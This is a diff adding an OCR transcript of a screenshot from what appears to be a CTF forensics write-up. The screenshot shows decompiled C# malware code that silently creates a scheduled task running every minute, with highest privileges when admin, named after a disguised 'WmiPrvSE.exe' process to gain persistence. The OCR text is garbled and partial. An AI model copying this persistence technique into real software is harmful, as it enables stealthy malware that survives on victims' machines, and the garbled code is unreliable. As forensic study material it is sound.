@@ -1,0 +1,21 @@
+# OCR: Pasted_image_20260415234103.webp
+# 来源: ./02-WriteUp/2026/2026-平航杯/Pasted_image_20260415234103.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 18:44
+
+74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105
+try
+ProcessstartInfo processstartInfo = new ProcessstartInfo("schtasks.exe") processstartInfo.windowStyle = Processwindowstyle.Hidden:
+if (conversions.T-Boolean(MUaD1UN9X5rN98KUAn5WbH3K0Z85RyCCg3gIDoL08mHgWogZYUPKBUWIW2vuwanlzJDsD93oLEVavFhmWRM9urmZakxV.is adminO)
+processstartInfo.Arguments = string.Concat(new string[]
+"/create /f /RL HIGHEsT /sc minute /mo 1 /tn ↓".
+Path.GetFileNamewithoutExtension(statics.WmiPrvSE.exe)
+"/tr  text
+else
+processstartInfo.Arguments = string.Concat(new stringl
+/create /f /sc minute /mo 1 /tn +"
+Path.GetFileNamewithoutExtension(statics.WmiPrvSE.exe)
+/tr text,
+Process process = Process. Start(processstartInfo) process.WaitForExit(O:
+catch
+(Exception ex4)
